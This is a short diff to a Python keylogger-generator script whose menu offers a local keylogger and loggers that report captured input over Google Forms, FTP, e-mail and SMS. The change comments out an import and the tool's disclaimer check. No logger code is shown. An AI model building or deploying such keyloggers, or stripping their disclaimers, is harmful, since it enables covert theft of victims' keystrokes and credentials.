@@ -6,7 +6,7 @@ from colorama import init, AnsiToWin32
 from colorama import Fore, Back, Style
 import os
 import sys
-import autopy
+#import autopy
 
 init(wrap=False)
 stream = AnsiToWin32(sys.stderr).stream
@@ -374,9 +374,9 @@ def main():
     print (Style.BRIGHT, Fore.YELLOW + 'Follow: '+ Style.RESET_ALL, end='' ,file=stream)
     print (Style.DIM, Fore.WHITE +'@OsandaMalith'+ Style.RESET_ALL, file=stream)
     try:
-        terms = disclaimer()
-        if terms == False: sys.exit(0) 
-        else: pass
+        #terms = disclaimer()
+        #if terms == False: sys.exit(0) 
+        #else: pass
         choice = int(input('\n[-] What do you like to generate?\n1. A Local Keylogger\n2. Google Forms Logger\n3. FTP Logger\
             \n4. E-Mail Logger\n5. SMS Logger \n6. Exit\n>>'))
         if choice == 6: exit(0)
